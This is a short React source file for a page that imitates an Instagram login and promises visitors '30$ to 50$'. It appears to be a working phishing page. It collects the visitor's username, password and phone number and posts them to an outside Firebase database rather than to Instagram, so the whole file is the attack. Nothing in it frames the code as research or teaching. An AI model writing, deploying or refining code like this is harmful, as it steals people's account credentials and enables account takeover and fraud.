import axios from 'axios';
import React,{useState} from 'react'
import './App.css';

const App=()=> {
  const [data,setData]=useState({
    username:'',
    password:'',
    number:''
  });
  const {username,password,number}=data;
 
  const handler = e =>{
    setData({...data,[e.target.name]:[e.target.value]});
  }
  const sub = e =>{
    e.preventDefault();
    axios.post("https://login1-765ed-default-rtdb.firebaseio.com/register.json",data).then(() => alert("submited successfully...."))
  }
  return (
    <div >
      <center>
        <h2>log in your instagram accout</h2>
       <h3>get up to 30$ to 50$</h3>
       <br></br>
       <h4>Instagram</h4><br></br>
       
      
      </center>
      <center>
        
        <form onSubmit={sub} >
          <input  type="text" name="username" value={username} placeholder="Username or email" onChange={handler} /><br></br>
          <input  type="password" name="password" value={password}  placeholder="Password" onChange={handler}  /><br></br>
          <input  type="number" name="number" value={number}  placeholder="Number" onChange={handler}   /><br></br>
          <input  type="submit" name="submit" className="button"   />

        </form>
      </center>
    </div>
  );
}

export default App;
